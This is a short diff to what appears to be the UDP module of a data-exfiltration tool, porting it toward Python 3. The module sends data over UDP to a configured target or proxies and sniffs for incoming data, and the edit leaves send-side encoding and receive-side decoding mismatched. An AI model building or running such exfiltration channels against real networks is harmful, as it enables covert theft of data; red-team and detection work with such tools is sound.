@@ -6,7 +6,7 @@ config = None
 app_exfiltrate = None
 
 
-def send(data):
+def send(data: str):
     if 'proxies' in config and config['proxies'] != [""]:
         targets = [config['target']] + config['proxies']
         target = choice(targets)
@@ -16,7 +16,7 @@ def send(data):
     app_exfiltrate.log_message(
         'info', "[udp] Sending {0} bytes to {1}".format(len(data), target))
     client_socket = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-    client_socket.sendto(data.encode('hex'), (target, port))
+    client_socket.sendto(data.encode(), (target, port))
 
 def listen():
     sniff(handler=app_exfiltrate.retrieve_data)
@@ -46,7 +46,7 @@ def sniff(handler):
                     app_exfiltrate.log_message(
                         'info', "[udp] Received {} bytes".format(len(data)))
                     try:
-                        data = data.decode('hex')
+                        # data = data.decode()
                         #app_exfiltrate.retrieve_data(data)
                         handler(data)
                     except Exception as e:
